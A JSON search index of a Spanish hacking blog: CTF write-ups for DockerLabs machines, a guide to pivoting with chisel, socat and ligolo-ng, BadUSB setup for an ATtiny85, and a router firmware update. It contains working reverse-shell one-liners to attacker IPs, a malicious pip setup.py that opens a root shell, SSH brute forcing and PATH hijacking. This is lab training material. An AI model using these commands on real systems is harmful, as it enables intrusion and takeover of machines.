[
  
  {
    "title": "Instalar Digistump attinny85 BADUSB en linux y arduino 2",
    "url": "/posts/Configurando-attiny85-digispark/",
    "categories": "Hardware",
    "tags": "hardware-hacking, attiny85, instalacion, Arduino2, Digistump",
    "date": "2025-06-22 00:00:00 -0300",
    





    
    "snippet": "Que es el attiny85El Digispark ATtiny85 USB es una placa de desarrollo compacta y de bajo costo, basada en el microcontrolador ATtiny85 de Atmel, que se puede programar utilizando el entorno de des...",
    "content": "Que es el attiny85El Digispark ATtiny85 USB es una placa de desarrollo compacta y de bajo costo, basada en el microcontrolador ATtiny85 de Atmel, que se puede programar utilizando el entorno de desarrollo integrado (IDE) de Arduino , en nuestro caso solo lo vamos a emplear como un BADUSB, el cual puede sernos util en diversas situaciones , exfiltracion de datos , envio de revshells , infeccion de dispositivos …..Asi que manos a la obra para modificar el a ttiny y usarlo como badusbInstalacion del software necesarioEn este tutorial lo vamos a configurar todo sobre sobre la version 2.x.x deArduino ide , lo mas importante es respetar las rutas donde nuestro ide busca las librerias, el compilador y el gestor micronucleus que sea compatible con la version instalada en nuestro attiny85.(En esta web tienen otro manual de como actualizar el micronucleus del dispositivo).Solo necesitaremos un para de cositas.      DigistumpArduino Enlace,o descargais como zip o os clonais el repo lo mismo da.        Opcional pero si sois usuarios de algun tipo de teclado o otro idoma tendremos que buscar los scancode_ascii_table.h pues los que trae digistump son en ingles y os fallaran cuando trateis de correr el badusb.(si no recuerdo tambien tambien reemplace el Digikeyboard.h por el que traia el paquete en español que encontre)        Si teneis el firm de attiny actualizado tambien os tocara descargar la version correcta de micronucleus Micronuecleus  Una vez todo descargado lo descomprimimos y vamos a empezar a llevar cada cosa a su sitio.1º-Al descomprimir DigistumpArduino nos aparecen tres carpetas de esas nos interesan solo dos en nuestro caso tools y digistump-avr.La carpeta digistump-avr debe ir en la siguiente ruta:```bash~/.arduino15/packages/arduino/hardware/digistump-avr``` Debe de quedar exacta la ruta para ambas carpetas y ahora la tools que incluye un launcher y el propio micronucleus.```bash/home/firstatack/.arduino15/packages/digistump/tools/micronucleus/2.0a4/```Con esos dos pasos ya deberiamos de poder seleccionar la plaquita en nuetro ide pero falta los permisos de escritura para udev.rules , paso necesario en archlinux.Para ello nos copiamos el **49-micronucleus.rules desde AquiLo copiamos a su sitiocp 49-micronucleus.rules /etc/udev/rules.d/Posteriormente ejecutamos dos comandos mas el primero para que Udev lea las nuevas reglas y el segundo para que evalue los dispositivos conectados.sudo udevadm control --reload-rulessudo udevadm triggerAhora nos aseguramos que el usuario este asigando al grupo uucp y si no lo esta lo asignamos , desconozco si ese grupo se nombra igual oen otras distribuciones.groups $(whoami)##Si  no esta añadidlosudo usermod -a -G uucp tu_usuarioCon esto ya podemos seleccionar la placa en el ide y subir nuestros skechts.TIPRecordaros que el scancode y el digiKeyboard.h han de cambiarse para que el badsusb funcione correctamente con el idioma y tipo de teclado que tiene cada objetivo.Yo les dejo los que son para castellano que a mi me ha funcionado de maravilla.Ficheros_ESCon todos esto ya debemos poder jugar con nuestro dispositivo, en breve actualizare con algunos skechts sencillos como practica.Un saludo y gracias por leer."
  },
  
  {
    "title": "Metodos de pivoting y herramientas",
    "url": "/posts/Pivoting_metodos_herramientas/",
    "categories": "Software",
    "tags": "pivoting, hacking, chisel, socat, ligolo, ligolo-ng, metasploit, port forwarding, tunneling",
    "date": "2025-06-18 00:00:00 -0300",
    





    
    "snippet": "Que es el pivotingEl pivoting es una técnica utilizada en el ámbito de la seguridad informática y el hacking ético que permite a un atacante o a un pentester acceder a redes o sistemas que de otro ...",
    "content": "Que es el pivotingEl pivoting es una técnica utilizada en el ámbito de la seguridad informática y el hacking ético que permite a un atacante o a un pentester acceder a redes o sistemas que de otro modo estarían fuera de su alcance. Esto se logra aprovechando un sistema comprometido para redirigir el tráfico hacia otros sistemas dentro de la misma red o hacia redes internas.Metodos de pivoting y port forwardingEl port forwarding es una técnica que permite redirigir el tráfico de un puerto específico en un sistema comprometido hacia otro sistema o puerto. Esto se puede hacer utilizando herramientas como ssh o socat chisel ligolo metasploit.Metodo manual con chisel y socatChisel es una herramienta que permite crear túneles TCP y redirigir el tráfico a través de un sistema comprometido. Socat es una herramienta similar que también permite redirigir el tráfico entre diferentes sockets.Entrando en materia dejamos claro que vamos a hacer un reverse port forwarding, es decir, vamos a redirigir el todo el tráfico desde un puerto en la máquina comprometida hacia un puerto en nuestra máquina atacante.  “Esto nos permitirá acceder a servicios que están detrás de un firewall o NAT, como bases de datos, servidores web, etc. o maquinas en otro segmento de red”Diagrama de red con ips  Tengamos claro que chisel nos abre un camino de ida pero no de vuelta , para poder ver desde la maquina2 a la maquina atacante debemos lanzar una instancia de socat en la maquina 1.Empzamos lanzando un chisel reverse en la maquina atacante../chisel server --reverse --port 11111Esto nos permite escuchar conexiones entrantes en el puerto 11111 de la máquina atacante.Ahora en la maquina 1 debemos lanzar un chisel client que se conecte al servidor chisel de la maquina atacante y redirija el puerto todo el trafico de la maquina 1 al puerto 11111 de la maquina atacante../chisel client &lt;IP_MAQUINA_ATACANTE&gt;:11111 R:socksEsto crea un túnel que redirige el todo tráfico de la máquina 1 al puerto 11111 de la máquina atacante , lo cual nos crea un proxy SOCKS en la máquina atacante.  Editamos /etc/proxychains.conf para que use el proxy SOCKS que hemos creado con chisel.Configurate el foxyproxi si es necesario si no tira con proxichains desde la terminal.Muchas tools topo feroxbuster … tienen opcion para usar un proxyEn este punto podemos ver la maquina dos pero ella no nos ve a nosotros vamos que no podemos mandarnos un revshell, para ello deberiamos crearnos una instacia de socat.Para tal proposito corremos socat en la maquina 1 que redirija el puerto X de la maquina 1 al puerto que tengamos en escucha al nc en la maquina atacante y desde la maquina dos mandar la revshell a la maquina 1 al puerto X que es donde escucha y reenvia el trafico al puerto de la maquina atacante.Dicho esto es lo mismo que debemos hacer para poder alcanzar la maquina 3, un socat en la maquina 1 y un chisel client en la maquina 2 , esto nos creara un proxy que nos permitira alcanzar la maquina 3Maquina 1:./socat tcp-l:33333,fork,reuseaddr tcp:192.168.0.103:11111Maquina 2:./chisel client 20.20.20.2:33333 R:55555:socksEsto redirige el tráfico del puerto 55555 de la máquina 2 al puerto 33333 de la máquina 1, que a su vez redirige al puerto 11111 de la máquina atacante.Pero pasa como antes la Maquina 3 no ve a la maquina atacante.Lo que hasta ahora tenemos es que ya alcanzamos  la maquina 3 , si todo a ido bien.Debemos ver lo siguiente en chisel server que esta en la maquina atacante.Ahora si para completar el pivoting al 100% y poder mandarnos una revshell desde la maquina 3 a la maquina atacante hemos de crear varias instancias de socat una en cada maquina intermedia que redirija el trafico de la maquina 3 a la maquina 2 y de la maquina 2 a la maquina 1 y de la maquina 1 a la maquina atacante.Maquina atacante:nc -lvnp 1190Maquina 1:./socat tcp-l:44444,fork,reuseaddr tcp:192.168.0.103:1190Ese comnando queda a la escucha en el puerto 44444 de la maquina 1 y redirige el trafico al puerto 1190 de la maquina atacante y en la maquina atacante hemos de tener netcat escuachando en dicho puertoMaquina 2:./socat tcp-l:44444,fork,reuseaddr tcp:20.20.20.2:44444Esto redirige el tráfico del puerto 44444 de la máquina 2 al puerto 44444 de la máquina 1.Maquina 3:bash -c 'exec bash -i &amp;&gt;/dev/tcp/30.30.30.2/44444 &lt;&amp;1'Esto manda una revshell a la maquina atacante a traves de la maquina 2 y la maquina 1.Pivoting completo con chisel y socat por mas maquinas que haya en medio el proceso es el mismo, creamos un socat en cada maquina intermedia que redirija el trafico al puerto de la maquina atacante y un chisel client que redirija el trafico de la maquina intermedia al puerto de la maquina atacante para que no cree un proxy SOCKS y podamos acceder a la maquina final.Ligolo-ngLigolo-ng es una herramienta de pivoting que permite crear túneles TCP y redirigir el tráfico a través de un sistema comprometido. Es similar a Chisel pero con algunas características adicionales.Es de tipo proxy y permite redirigir el tráfico de un puerto específico en un sistema comprometido hacia otro sistema o puerto. Ligolo-ng es especialmente útil para acceder a servicios que están detrás de un firewall o NAT.Usando ligolo-ngPara usar ligolo-ng, primero debemos instalarlo en la máquina atacante y en la máquina comprometida. Luego, podemos iniciar un servidor ligolo-ng en la máquina atacante y un cliente o agent en cada  máquina comprometida. Mejor vamos al ejemplo que se nos entiende mejor.Diagrama de red con ipsEl mismo que antesEn la maquina atacantePara empezar en la maquina atacante lanzamos el ligolo-ng server que queda a la escucha en el puerto 11601 el que es por defecto en ligolo-ng../proxy --selfcertEsto inicia el servidor ligolo-ng y genera un certificado autofirmado para la comunicación segura entre el cliente y el servidor.Si nos fijamos vemos que se que a la escucha esperando comunicacion desde cualquier ip.Antes de ir a la maquina1 , debemos configurar el interfaz de red para que ligolo-ng pueda redirigir el tráfico para esto en nnuestra maquina atacante crearemos un nuevo interfaz.  Habra que crear uno para cada proxy o salto ,mas adelante se ve    sudo ip tuntap add user $USER mode tun ligolo    sudo ip link set dev ligolo up              sudo ip route add 20.20.20.0/24 dev ligoloEsto crea un nuevo interfaz de red llamado ligolo y lo configura para redirigir el tráfico hacia la red que hayamos declarod en el interfaz, en este caso 20.20.20.0/24 que es la maquina2.En la maquina1Hemos de transferirnos el agente para ligolo-ng a la maquina 1, una vez transferido lo lanzamos con el siguiente comando:./agent -connect 192.168.0.103:11601 -ignore-certEsto nos connecta al servidor ligolo-ng en la máquina atacante y nos permite redirigir el tráfico a través de la máquina 1.Llegados hasta aqui hemos de regresar a la maquina atacante y ver las sesiones activas y darle a start a la sesion que hemos creado con el agente de la maquina 1.Dentro del propio proxy ejecutamos y controlamos los tunneles que hemos creado con ligolo-ng.maquina atacantesessionstartEsto nos crea el primer tunnel y nos permite ver la maquina dos pero no podremos ni mandarnos una revshell,ahora vamos a crear un listener dentro del proxy en el agente de la maquina 1 que redirija el trafico del puerto 8080 de la maquina 1 al puerto 8080 de la maquina atacante.listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 -tcpEsto crea un listener en el puerto 8080 de la máquina 1 que redirige el tráfico al puerto 8080 de la máquina atacante para de ese modo poder transferirnos ficheros.Igual hariamos para una RV pero con nc escunchando en el puerto 8080 de la maquina atacante.Ahora ya podemos transferirnos el agente de la maquina atacante a la maquina 2 por medio del tunnel , con el fichero transferido y como hay una tercera maquina que queremos alcanzar debemos crear un nuevo interfaz de red para la maquina 2.    sudo ip tuntap add user $USER mode tun ligolo2    sudo ip link set dev ligolo2 up    sudo ip route add 30.30.30.0/24 dev ligolo2Esto crea un nuevo interfaz de red llamado ligolo2 y lo configura para redirigir el tráfico hacia la red que hayamos declarado en el interfaz, en este caso 30.30.30.0/24 que es la maquina3.Para poder lanzar el agente en la maquina 2 y que alcanze nuestro proxy debemos crear otro listener en la maquina uno pero esta vez que redirija el trafico hacia el puerto 11601 que es el de ligolo.listener_add --addr 0.0.0.0:11601 --to 10.10.10.1:11601 --tcpAhora ya podemos lanzar el agente en la maquina 2 que se conectara al proxy de la maquina 1 y redirigira el trafico hacia la maquina atacante.En la maquina 2./agent -connect 20.20.20.2:11601 -ignore-certAhora volvemos a la maquina atacante y vemos que tenemos una nueva sesion activa, la de la maquina 2.Primero debemos activar la interfaz ligolo2session #ELEGIR LA DEL AGENTE DE LA MAQUINA 2start --tun ligolo2Ahora ya vemos la maquina 3 y debemos de conseguir mandarnos una revshell desde la maquina 3 a la maquina atacante, para ello debemos crear un listener en la maquina 2 que redirija el trafico del puerto 44444 de la maquina 2 al puerto 44444 de la maquina 1 y esta a su vez lo mande a la atacnte donde estara nc a la escucha en 44444.En el agente de la maquina doslistener_add --addr 0.0.0.0:44444 --to 20.20.20.2:44444 --tcpEn la 1 lo mismo pero cambia la iplistener_add --addr 0.0.0.0:44444 --to 10.10.10.1:44444 --tcpAhora ya podemos mandar una revshell desde la maquina 3 a la maquina atacante.En la maquina 3bash -c 'exec bash -i &amp;&gt;/dev/tcp/30.30.30.2/12345 &lt;&amp;1'Ponganse a la escucha en la maquina atacanteHasta aqui ligolo , puede ser un poco mas complejo de enterder al hacer las tareas por atras pero es mucho mas limpio y ordenado que tirar de chisel y socat, mas practica me falta con ligolo pero me gusto bastante.En breve practicare con metasploit y sus modulos de pivoting que son muy buenos y nos permiten hacer lo mismo que con ligolo-ng pero con una interfaz grafica y mas facil de usar o eso dicen.Muchas gracias por llegar hasta aqui , difundan lo que aprendan y recuerden que la seguridad es cosa de todos."
  },
  
  {
    "title": "PkgPoison, DockerLabs",
    "url": "/posts/pkgpoison/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, nmap, feroxbuster, hydra, pip3, python",
    "date": "2025-06-17 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing ficheros y dirs      feroxbuster...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing ficheros y dirs      feroxbuster              fuerza bruta      hydra              escalada de privilegios      pip3      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pkgpoison 172.18.0.2reporteComo vemos tenemos el 80 http y el 22 ssh, sin mas demora revisamos la web y lanzamos un feroxbuster para ver que directorios y ficheros hay.No me queda claro si ssh en esa version es explotable.En la web no hay nada y een el codigo tampoco pero con ferox tuvimos suerte notes/note.txt.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt -t 40 -u http://172.17.0.2Accedemos a notes/note.txt y vemos que nos dan dos posibles usuarios Admin y dev y una contraseña, con esto vamos a lanzar un ataque de fuerza bruta contra ssh.Primero le tiro al dev.El pass lo cambiohydra -l dev -P Descargas/rockyou.txt/rockyou.txt ssh://172.17.0.2Tenemo login con dev:computer, para empezar compruedbo sudo , seuid , procesos etc.. y solo obtengo resultado buscando ficheros del usuario adminfind / -user admin 2&gt;/dev/nullSi no fijamos bien en la ultima linea se distigue lo que puede ser la password de admin.Hacemos su no nos convertimos en admin.su adminAhora veamos que nos dejaron como user admin ejwcutamos los comandos de costumbre.Esta vez hay suerte con sudo -l.nos permite ejecutar pip3 como root y hasta donde yo entiendo eso nos permite instalar paquetes como root por tanto cualquier comando que coloquemos en un instalador se ejecutara como root.Asi que sin demora y como no lo he hecho antes cosnsultemos a google y me contesta la ia , estos de google se la juegan poniendo antes su resultado que los pratocinados que les pagan.Estrutura de directorios de un paquete pip:mi_paquete/├── __init__.py├── setup.py1-º __init__.py:Este archivo indica que un directorio es un paquete Python. Puede estar vacío o contener código de inicialización del paquete2-º setup.py:Este archivo contiene la información sobre tu paquete, como el nombre, la versión, la descripción, las dependencias y nuestro codigo malicioso.from setuptools import setup, Commandimport osclass CustomInstallCommand(Command):    def initialize_options(self):        pass    def finalize_options(self):        pass    def run(self):        # tratamos priomero de una revshelll        os.system(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.103/1192 0&gt;&amp;1'\")        # si no funciona probamos con un comando mas sencillo que nos crre una bash con privilegios de root        # os.system(\"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash\")setup(    name='maloso',    version='1.0',    description='reverse shell',    cmdclass={        'install': CustomInstallCommand,    })Una con todos los ficheros en su lugar debemos ejecutar un comando para que nos cree el paquete , aunque pienso que comprimiendolo nosotros mismos con tar.gz o zip tambien funcionaria.python3 setup.py sdistEsto nos creara un fichero dist/maloso-1.0.tar.gz que es el que vamos a instalar con pip3.Ahora solo nos queda instalarlo , para ello levanto un server http en mi maquina y lo llamo desde la maquina victika y si todo va bien nos ha de devolver una reverse shell.python3 -m http.server 8080sudo /usr/biun/pip3 install http://192.168.0.103:8080/maloso-1.0.tar.gz  Ojo con la direccion que yo la puse mal y me tiraba error en la instalacion.Todo ha ido bien ahora tenemos una reverse shell como root.Muchas gracias poor leerme, espero que te haya gustado y que te sirva de ayuda."
  },
  
  {
    "title": "Actualizando dsr250 n",
    "url": "/posts/dsr250n/",
    "categories": "Hardware",
    "tags": "legacy, Firmware, Hardware, tls 1.0, 1.1",
    "date": "2025-06-11 00:00:00 -0300",
    





    
    "snippet": "Actualizar router DSR-250NEn este post vamos a ver como actualizar el firmware de un router DSR-250N de D-Link, que es un router que ya tiene unos años y que no soporta TLS 1.2 ni 1.3, por lo que e...",
    "content": "Actualizar router DSR-250NEn este post vamos a ver como actualizar el firmware de un router DSR-250N de D-Link, que es un router que ya tiene unos años y que no soporta TLS 1.2 ni 1.3, por lo que es recomendable actualizarlo para mejorar la seguridad dado que versiones viejas tienen hasta conocidos rce.Requisitos  Un router DSR-250N  Un ordenador con acceso a internet  Obtener el firmware más reciente desde la web oficial de D-Link correspondiente a tu router  Un cable de red RJ45  Un navegador web (recomendado Firefox o Chrome)SituacionLa verdad decido hacer este post por un fallo reciente que encontre estando trabajando en la creacion de un laboratorio de pruebas para hacer pivoting en entre varias maquinas virtuales y mi sorporesa fue mayuscula cuando al realizar un ping comprobe que veia maquinas de la red privada de mi proveedor de internet (ya reportado y reparado), pero el problema grave venia cuando comprobe que la maquina tenia software obsoleto , plagado de cves y despues de comentarselo me informaron que era porque la tenian en legacy.Todo ello me hizo acordarme de ese router viejo que compre de segunda mano pra trastear y que nunca lo habia actualizado, por lo que decidi ponerme manos a la obra y actualizarlo.Pasos a seguir      Importante:Lo primero que debemos hacer y tener claro es que si estamos en una version muy vieja como es el mi caso que eesta en una version 2.0.2 , deberemos pasar por una actualizacion intermedia para poder instalar la ultima disponible de este modelo que segun lo que lei es la 3.11 pese a que hay una 3.17 pero no funciona en mi modelo.        Descargar el firmware: Accede a la web oficial de D-Link y descarga el firmware correspondiente a tu modelo. Asegúrate de que es la versión correcta para tu router DSR-250N revison de hardware Ax Bx la que sea la tuya.Firmwares Oficiales        Conectar el router: Conecta tu ordenador al router mediante un cable de red RJ45. Asegúrate de que estás conectado a la red del router.        Acceder a la interfaz web: Abre un navegador web y escribe la dirección IP del router (por defecto suele ser 192.168.10.1). Inicia sesión con tus credenciales (por defecto suele ser admin/admin).        Corroborar la version del firmware a instalar: Como en mi caso parto de una 2.11 , descargo el zip DSR-250N FW 3.11.zip (94.62 MB) , el cual contiene unas carpetas los nombres de caules son muiy esclarecedores pues nos indica que primero hay que intalar un intermedio y luego el common pese a que ambos son la misma version 3.11.        Actualizar el firmware: Ve a la sección de “Firmware Upgrade” o “Actualización de firmware” en la interfaz web del router. Selecciona el archivo del firmware que has descargado y haz clic en “Actualizar”Ojo que primero has de instalar el que esta en la carpeta 1.Intermediate_FW_for_A2_B1. Espera a que el proceso se complete. No apagues el router durante este proceso.Posteriormente , instala el de la carpeta common.Despues y en teoria ya podrias pasar directo a la 3.17, sin pasar por las otras versiones intermedias, pero yo  lo he probado y no instala la 3.17 directo imagino que se debera pasar tambien por las 12 ,13 y 14 antes de instalar la 3.17.        Reiniciar el router: Una vez que la actualización se haya completado, el router se reiniciará automáticamente. Si no lo hace, puedes reiniciarlo manualmente.        Verificar la actualización: Accede nuevamente a la interfaz web del router y verifica que la versión del firmware se ha actualizado correctamente a la versión 3.11.  Problemas comunes      Error tls: Este es realmente el motivo del articulo , equipos obsoletos y expuestos en empresas para poder gestionar otros equipos que a su vez tambien son obsoltos pero insustituibles por el momento, por lo que es recomendable actualizar el firmware a la ultima version disponible para mejorar la seguridad y evitar problemas de compatibilidad con navegadores modernos.        Soluciones: Para evitar tener que mantener equipos antiguos que usamos para configurar otros viejos como pueden ser routters, switches gestionados, etc que no soporten los actuales modelos de seguridad y cifrados como TLS 1.2 o 1.3, es recomendable actualizar el firmware a la ultima version disponible para mejorar la seguridad y evitar problemas de compatibilidad con navegadores modernos. Si no es posible actualñizar el firmaware, se puede utilizar un navegador antiguo o una version de firefox ESR que soporte TLS 1.0 y 1.1, pero esto no es recomendable por motivos de seguridad.Tambien podemos crear una maquina virtual que solo usemos para este proposito de gestionar equipos antiguos y que no tenga acceso a internet, de esta manera evitamos que un ataque pueda comprometer nuestra red.  TrickComo consejo final y mi recomendacion personal y si nos queremos complicar lo mejor es hacer uso de tu propio navegador (si el problema solo es el tls) en mi caso firefox y activar temporalmente el soporte para TLS 1.0 y 1.1, de esta manera podras acceder a la interfaz web del router sin problemas y realizar la actualizacion del firmware.Para ello, abre Firefox y escribe about:config en la barra de direcciones. Busca en las preferencias security.tls.version.enable-deprecated y cámbialas a true, de esta manera podras acceder a la interfaz web del router sin problemas y realizar la actualizacion del firmware.No olvidemos luego regresarlo a False para evitar problemas de seguridad.ConclusiónActualiza y no mantengas equipos obsoletos en tu red, ya que pueden ser un punto de entrada para atacantes y comprometer la seguridad de tu red. Mantener el firmware actualizado es una buena práctica de seguridad que te ayudará a proteger tus dispositivos y datos.Espero que este post te haya sido de ayuda y que puedas actualizar tu router DSR-250N sin problemas. Si tienes alguna duda o problema, no dudes en dejar un comentario y estaré encantado de ayudarte.Un saludo y muchas gracias por leerme"
  },
  
  {
    "title": "LittlePivoting, DockerLabs",
    "url": "/posts/littlepivoting/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, pivoting, nmap, feroxbuster, hydra, searchbins",
    "date": "2025-06-08 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              reverse shell      urlencodeada         ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              reverse shell      urlencodeada              tratamiento de tty      script, stty, reset              pivoting      chisel socat              tunneling      proxychains              escalada de privilegios      searchbins      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre a la primera maquina en mi caso le tire a la upload.Uploadsudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX upload 172.18.0.2reporteComo vemos solo tenemos el 80 httpNos han dejado una subida de difcheros sin sanitizar nada asi que subimos una revsshhell o webshell para mandadrnos una reverse shell.Una vez debtro con sudl -l vermos que nos has dejado el binario env lo usamos para escalar.sudo env /bin/shRealizamos tratamiento tty.Listamos dispositivos y direcciones.ls /sys/class/net/hostname -IPivotingEmpezamos con el pivoting, para ello usamos chisel y socat.En la maquina atacante lanzamos una instancia a modo servidor de chisel el cual se queda a la escucha y en la upload lanzamos el cliente de chisel que se conecta al servidor y le dice que cree un tunel en el puerto 11111.Port forwading./chisel server --reverse -p 11111En la maquina victima lanzamos el cliente de chisel que se conecta al servidor y le dice que cree un tunel en el puerto 2222../chisel client 10.10.10.1:11111 R:socksCon esto conseguim,os que los ver la maquina victima 2 pero ella no nos ve mas adelante y cuando ya tengamos vulnerada la maquina 2 configurearemos socat para que ella nos vea a nosotros y nosotros a ella.No nos olvidemos de configurar el proxychains para que use el tunel de chisel y poder alcanzar la maquina 2 para escanearla.proxychains nmap -A -n -Pn 20.20.20.3Ya vemos los puertos de la siguiente maquina, revisemos la web a ver que encontramos a simple vista no nada asi que fuzzing.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt -t 40 -u http://20.20.20.3 -p socks5://127.0.0.1:1080Si accedemos a 20.20.20.3/secret.php vemos que nos dan un usuario  asi que vamos a realizar fuerza bruta contra ssh y dicho usuario.proxychains hydra -l mario -P Descargas/rockyou.txt/rockyou.txt ssh://20.20.20.3 Una vez conseguido el usuario y la contraseña nos conectamos a la maquina 2.proxychains ssh mario@20.20.20.3Una vez dentro de la maquina 2  y listamos los dispositivos y direcciones y comprobamos como escalar a root , vemos que nos han dejado a vim.Entramos a vim y ejecutamos el comando :!/bin/bash para ejecutar una shell de bash dentro de vim y manterner los privilegios de root.Ahora que ya somo root podriamos volver a crear los tunenles de chisel, para ello me abro otra revshell en la maquina 1 para poder mandar los binarios de chisel y socat a la maquina 2.Recapitulamos de momento tenemos la maquina 1 y la 2, la 1 es la que nos da acceso a la 2 y la 2 es la que nos dara acceso a la 3.Pero de moemento no vemos desde la atacante la 3 , solo la 1 de modo normal y la dos a traves de proxychainsAhora en la maquina 1 hemos de empezar a usar socat para que la maquina 2 nos vea a nosotros.Socat nos va a permitir crear un tunel que reenvie todo el trafico de la maquina 2 a traves de la maquina 1 la cual lo vuelve a redirigir a la maquina atacante.Para ello lanzamos socat en la maquina 1 a modo redicreccionanor que escucha en el puerto 1111 y redirige todo el trafico a la maquina atacante../socat tcp-l:33333,fork,reuseaddr tcp:192.168.0.101:11111Ahora en la maquina 2 lanzamos el cliente de chisel que se conecta al servidor y le dice que cree un tunel en el puerto 2222../chisel client 20.20.20.2:33333 R:55555:socksCon esto conseguimos que la maquina 2 vea a la maquina 1 y la maquina 1 vea a la maquina 2 , tambiwen vemos la maquina 3 pero ella no nos ve a nosotros para enviarnos un revshell deberiamos de crear una instancias tanto en la maquina como en la maquina 2 para dirigir todo el trafico hacia la instacia de chisel server en nuestra maquina atacante.Ahora volvemos a configurar el proxychains para que use el tunel de chisel y poder alcanzar la maquina 3 para escanearla.Aqui un diagrama para tratar de comprender visualmente que es lo que hacemos:cortesia de gpt, aunque hubiese sido mas entendible hacerlo con paint"
  },
  
  {
    "title": "Galeria, DockerLabs",
    "url": "/posts/galeria/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, nmap, feroxbuster, searchbins, pathjacking",
    "date": "2025-05-16 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing directorios y ficheros      fero...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing directorios y ficheros      feroxbuster              revshell      bash              escalada de privilegios      nano              Pahthijacking      creacion de script      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX walkingdead 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 21 ftp, el 80 httpYo no encontre nada interesante en el ftp pero si en el http, en este caso la web es una galeria de imagenes y aplicandole fuzzing aparecen cositas interesantes.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php -t 400 -u http://172.17.0.2De todo eso eso nos interesa el handler.php, que es un script que se encarga de subir imagenes a la galeria.Tratandose de una facil directamente subo un una webshell.php y me la ejecuto.Ahora solo debemos ir a la ruta donde sea subido que deberia ser la misma de donde estan las fotos en feroxbuster lo hemos visto antes.Desde la webshell puedes hacer lo que el usuario te permita pero yo la uso para mandarme un revshell “es lo que tenia a mano” no sin antes ponernos en escucha con ncnc -lvnp 1188bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.0.106/1188 &lt;&amp;1'Como la terminal no parece ser un tty le realizo **tratamiento de la tty .script /dev/null -c bash    control Z con esto la pasamos a segundo plano  stty raw -echo ; fg  reset    en otra terminal lanzamos stty size para saber el numero de filas y columnas de nuestra terminal  export TERM=xterm  export SHELL=bash  stty rows 32 columns 149Infiltracion y escalada de privilegiosAhora que tenemos acceso a la terminal de la maquina, lo primero que hacemos es ver que usuario somos.whoamiObvio somo www-data , ejecutamos lo tipico sudo -l.Vemos que podemos ejecutar como gallery el otro usuario no se que pinta dado que ya soy el.searchbins -b nano -f sudosudo -u gallery /usr/bin/nanoy seguimos los pasos de searchbins para convertirnos en gallery.Ya como gallery hacemos lo mismosudo -lEn esta ocasion nos han dejado un binario que podemos ejecutar como root.Observemos lo que haceVemos que trata de convertir imagenes con un comando que se incluye en imagemagick o al menos antes formaba parte del paquete , pero bueno la cuestion es que no lo encuentra y lo que vamos a hacer es crearnos un script en nuestro home con el nombre convert y le damos permisos de ejecucion y posteriormente añadimos la ruta donde hemos creado el script al path de la variable de entorno.echo \"/bin/bash -p\" &gt; /home/gallery/convertchmod +x /home/gallery/convertexport PATH=/home/gallery:$PATHAhora si ejecutamos el binario como root nos da una shell de root.Muchas gracias a difundir y compartir lo que sabemos."
  },
  
  {
    "title": "TheDog , DockerLabs",
    "url": "/posts/thedog/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, xxd, nmap, scapy, python, msfconsole, ping pattern",
    "date": "2025-05-03 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de ficheros      feroxbuster    ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de ficheros      feroxbuster              reverse cgi      CVE-2021-41773              transferncia de ficheros      ping              codificacion hexadecimal      xxd              scripting      python3 y bash              cadenas binario      strings              fuerza bruta      su brute en local      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX thedog 172.18.0.2reporteComo vemos el puerto 80 esta abierto y es un servidor apache en version 2.4.49 , con el comando tipico para ctf tambien nos indica que hay un metodo TRACE peligroso , pero primero vamos a ver que hay en la web.Aparte de una cancion punky sonando no encuentro nada raro , excepto por un detalle del codigo fuente que me indica que hay pistas en un html oculto.Asi que hacemos fuzzing con feroxbuster.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html -t 400 -u http://172.17.0.2Nos encuentra el html y nos deja claro que nos va a tocar usar ping para algo , por este camino no vamos bien volvamos a realizar una buena enumeracion con nmap a ver que mas nos puede mostrar.Si lanzamos dirb con si diccionario por defecto tambien nos dice cositas interesantes.Vamos a nmap y ejecuto lo siguientenmap -p 80 -sV --script vuln -n -Pn 172.17.0.2 -oA puerto80nmapComo vemos nos saltan un monton de vulnerabilidades conocidas de apache en la versuon 2.4.49 ,no a todas es susceptible de explotacion 